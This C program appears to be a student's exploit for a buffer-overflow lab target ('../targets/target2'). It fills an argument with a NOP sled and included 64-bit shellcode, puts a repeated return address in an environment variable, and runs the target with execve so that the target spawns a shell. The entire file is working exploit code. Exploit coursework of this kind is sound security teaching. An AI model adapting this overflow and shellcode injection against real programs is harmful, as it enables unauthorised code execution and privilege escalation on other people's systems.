#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define TARGET_ADDR_0 0x40
#define TARGET_ADDR_1 0xfd
#define TARGET_ADDR_2 0xa4
#define TARGET_ADDR_3 0x40
#define BUFSIZE 271 
#define ENVSIZE 13
#define SHELLSIZE 45
#define NOPSIZE 32
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];
	char attackBuffer[BUFSIZE];
	char envBuffer[ENVSIZE+1];
	
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	for (i = 0; i < SHELLSIZE; i++){
		attackBuffer[NOPSIZE + i] = shellcode[i];
	}
	for (i = 0; i < ENVSIZE; i++){
		if(i%4==0){
			envBuffer[i] = TARGET_ADDR_0;
		}else if(i%4==1){
			envBuffer[i] = TARGET_ADDR_1;
		}else if(i%4==2){
			envBuffer[i] = TARGET_ADDR_2;
		}else{
			envBuffer[i] = TARGET_ADDR_3;
		}
	}
	envBuffer[ENVSIZE] = '\0';
	attackBuffer[264] = 0x0b;
	attackBuffer[268] = 0x1b;
	attackBuffer[269] = 0x01;
	attackBuffer[270] = '\0';

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = "";
	env[1] = envBuffer;
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
